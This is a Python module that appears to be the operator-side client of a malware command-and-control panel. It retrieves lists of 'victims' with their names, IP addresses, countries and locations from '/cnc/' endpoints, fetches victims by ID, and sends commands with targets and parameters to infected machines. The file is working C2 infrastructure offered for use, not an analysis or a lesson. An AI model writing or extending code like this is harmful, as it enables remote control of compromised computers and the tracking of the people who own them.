from .config import API
import requests
from .structs import Victim
import urllib.parse

class Api:

    def __GENERATE_VICTIM_STRUCT(data:list):
        for victim in data["data"]:
                index  = data["data"].index(victim)
                d = urllib.parse.quote_plus(f"{victim[1]}{victim[0]}")
                img = (f"https://api.dicebear.com/7.x/bottts/svg/seed={d}")
                victimobj = Victim(id=victim[0],name=victim[1],ip=victim[2],country=victim[3],location=victim[4],img=img)
                data["data"][index] = victimobj
        return data
    
    def get_all_victims():
        r = requests.get(API+"/cnc/getallvictimsdata").json()
        if r:
            return Api.__GENERATE_VICTIM_STRUCT(r)
        else:
            return None
    
    def get_victim_by_id(id:int):
        r = requests.get(API+f"/cnc/getbyid/{id}").json()
        print(r)
        if r:
            return Api.__GENERATE_VICTIM_STRUCT(r)
        else:
            return None
    def new_command(command: str, target: str, parameter: str | None = None):
        Data = {"command": command, "target": target, "parameter": str(parameter)}
        r = requests.post(API+ "/cnc/command", json=Data).json()
        print(r)
        if r["Status"]:
            return True
        else:
            False

    def get_response(id:int):
        ...
if __name__ == "__main__":
    print(Api.get_all_victims())